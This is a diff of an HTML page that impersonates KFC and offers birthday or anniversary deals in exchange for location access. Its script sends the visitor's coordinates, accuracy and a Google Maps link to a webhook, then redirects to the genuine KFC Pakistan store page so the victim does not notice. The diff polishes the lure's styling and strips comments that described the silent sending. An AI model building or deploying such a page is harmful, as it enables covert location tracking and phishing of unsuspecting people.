@@ -2,55 +2,84 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>KFC</title>
+  <title>KFC VIP Deals</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
+    html, body {
       margin: 0;
+      padding: 0;
+      height: 100%;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to bottom, #ffe8d6, #ffd5a5);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      overflow: hidden;
+      background: linear-gradient(to bottom, #fff2e6, #ffd5a5);
+    }
+
+    .bg-animation {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    .bg-animation img {
+      position: absolute;
+      width: 80px;
+      animation: float 15s infinite linear;
+      opacity: 0.4;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0;
+      }
+      50% {
+        opacity: 0.4;
+      }
+      100% {
+        transform: translateY(-200px) rotate(360deg);
+        opacity: 0;
+      }
     }
 
     .card {
-      background: #fff;
-      padding: 40px 30px;
-      border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      background: white;
       text-align: center;
-      width: 90%;
-      max-width: 420px;
+      padding: 50px 30px;
+      max-width: 500px;
+      margin: 80px auto;
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+      transition: all 0.6s ease-in-out;
     }
 
     .logo {
-      width: 100px;
-      margin-bottom: 20px;
+      width: 150px;
+      margin-bottom: 25px;
     }
 
     h1 {
+      font-size: 2.6rem;
       color: #d40000;
-      font-size: 2.2rem;
-      margin-bottom: 10px;
+      margin: 10px 0;
     }
 
     p {
-      color: #333;
       font-size: 1.1rem;
+      color: #333;
     }
 
     .btn {
+      margin-top: 30px;
+      padding: 15px 30px;
       background-color: #d40000;
       color: white;
-      font-size: 1.1rem;
-      padding: 14px 28px;
       border: none;
-      border-radius: 40px;
-      margin-top: 30px;
+      border-radius: 50px;
+      font-size: 1.2rem;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: background-color 0.3s;
     }
 
     .btn:hover {
@@ -64,10 +93,20 @@
 </head>
 <body>
 
+  <!-- Animated Background -->
+  <div class="bg-animation">
+    <img src="drumstick.png" style="top: 90%; left: 5%; animation-delay: 0s;">
+    <img src="sauce.png" style="top: 95%; left: 25%; animation-delay: 4s;">
+    <img src="wing.png" style="top: 100%; left: 60%; animation-delay: 2s;">
+    <img src="drumstick.png" style="top: 98%; left: 75%; animation-delay: 6s;">
+    <img src="sauce.png" style="top: 95%; left: 90%; animation-delay: 1s;">
+  </div>
+
+  <!-- Main Card -->
   <div class="card">
     <img src="kfc-logo.png" alt="KFC Logo" class="logo">
     <h1>KFC</h1>
-    <p>Allow location to unlock nearby KFC deals on your Birthday or Anniversary 🎁</p>
+    <p>Allow location to unlock exclusive nearby deals for your Birthday or Anniversary 🎁</p>
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
     <div id="status"></div>
   </div>
@@ -86,20 +125,17 @@
           const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
           const message = `🍗 **Nearby KFC Deal Request**\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Accuracy: ${accuracy} meters\n🔗 [Google Maps](${mapUrl})`;
 
-          // Send location silently
           fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ content: message })
           }).finally(() => {
-            // Redirect after slight delay
             setTimeout(() => {
               window.location.href = "https://www.kfcpakistan.com/store-locations";
             }, 1000);
           });
         },
-        (error) => {
-          // If user denies or error occurs, redirect anyway
+        () => {
           window.location.href = "https://www.kfcpakistan.com/store-locations";
         }
       );
@@ -108,4 +144,5 @@
 
 </body>
 </html>
+
 
